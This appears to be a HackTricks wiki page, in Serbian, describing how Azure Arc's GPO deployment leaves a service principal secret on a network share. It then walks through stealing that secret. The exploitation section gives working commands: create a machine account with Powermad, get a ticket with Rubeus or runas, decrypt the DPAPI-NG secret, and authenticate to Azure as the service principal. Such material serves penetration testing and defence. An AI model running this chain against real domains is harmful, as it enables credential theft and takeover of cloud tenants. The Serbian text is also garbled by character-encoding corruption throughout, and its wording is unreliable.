# Az - Azure Arc Vulnerable GPO Deploy Script

{% hint style="success" %}
U캜ite i ve쬭ajte hakovanje AWS-a: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
U캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

### Identifikacija problema

Azure Arc omogu캖ava integraciju novih internih servera (pridru쬰nih serverskih domena) u Azure Arc kori코캖enjem metode Group Policy Object (GPO). Da bi olak코ao ovaj proces, Microsoft pru쬬 set alata za implementaciju neophodnih za pokretanje postupka u캜lanjivanja. Unutar ArcEnableServerGroupPolicy.zip datoteke mogu se prona캖i slede캖i skriptovi: DeployGPO.ps1, EnableAzureArc.ps1 i AzureArcDeployment.psm1.

Prilikom izvr코avanja, DeployGPO.ps1 skript vr코i slede캖e akcije:

1. Kreira Azure Arc Servers Onboarding GPO unutar lokalne domene.
2. Kopira EnableAzureArc.ps1 skript za u캜lanjivanje na odre캠eni mre쬹i deljeni resurs kreiran za proces u캜lanjivanja, koji tako캠e sadr쬴 Windows instalacioni paket.

Prilikom pokretanja ovog skripta, sistem administratori moraju obezbediti dva glavna parametra: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Dodatno, potrebni su i drugi parametri kao 코to su domen, FQDN servera koji hostuje deljeni resurs, i naziv deljenog resursa. Dodatni detalji poput ID-a zakupca, grupe resursa i ostalih neophodnih informacija tako캠e moraju biti obezbe캠eni skriptu.

Enkriptovan tajni klju캜 se generi코e u AzureArcDeploy direktorijumu na odre캠enom deljenom resursu kori코캖enjem DPAPI-NG enkripcije. Enkriptovani tajni klju캜 se 캜uva u datoteci nazvanoj encryptedServicePrincipalSecret. Dokazi o tome mogu se prona캖i u DeployGPO.ps1 skriptu, gde se enkripcija vr코i pozivom ProtectBase64 sa $descriptor i $ServicePrincipalSecret kao ulazima. Deskriptor se sastoji od SID-ova grupa Domain Computer i Domain Controller, obezbe캠uju캖i da tajni klju캜 mo쬰 biti dekriptovan samo od strane grupa za bezbednost Domain Controllers i Domain Computers, kako je navedeno u komentarima skripta.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Eksploatacija

Imamo slede캖e uslove:

1. Uspe코no smo prodrli u internu mre쬿.
2. Imamo mogu캖nost da kreiramo ili preuzmemo kontrolu nad korisni캜kim nalogom na ra캜unaru unutar Active Directory-ja.
3. Otkrili smo deljeni mre쬹i resurs koji sadr쬴 direktorijum AzureArcDeploy.

Postoji nekoliko metoda za dobijanje korisni캜kog naloga ma코ine unutar AD okru쬰nja. Jedna od naj캜e코캖ih je iskori코캖avanje kvote korisni캜kog naloga ma코ine. Druga metoda uklju캜uje kompromitovanje korisni캜kog naloga ma코ine putem ranjivih ACL-ova ili razli캜itih drugih lo코ih konfiguracija.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Kada se dobije nalog ma코ine, mogu캖e je autentifikovati se koriste캖i ovaj nalog. Mo쬰mo koristiti runas.exe komandu sa netonly zastavicom ili koristiti pass-the-ticket sa Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Kada imamo TGT za nalog na코eg ra캜unara sa캜uvan u memoriji, mo쬰mo koristiti slede캖i skript za de코ifrovanje tajne servisnog principala.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativno, mo쬰mo koristiti [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

U ovom trenutku, mo쬰mo prikupiti preostale informacije potrebne za povezivanje sa Azure-om iz ArcInfo.json datoteke, koja je sme코tena na istoj mre쬹oj deljeni kao i datoteka encryptedServicePrincipalSecret. Ova datoteka sadr쬴 detalje poput: TenantId, servicePrincipalClientId, ResourceGroup, i vi코e. Sa ovim informacijama, mo쬰mo koristiti Azure CLI za autentifikaciju kao kompromitovani servisni princip.

## Reference

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
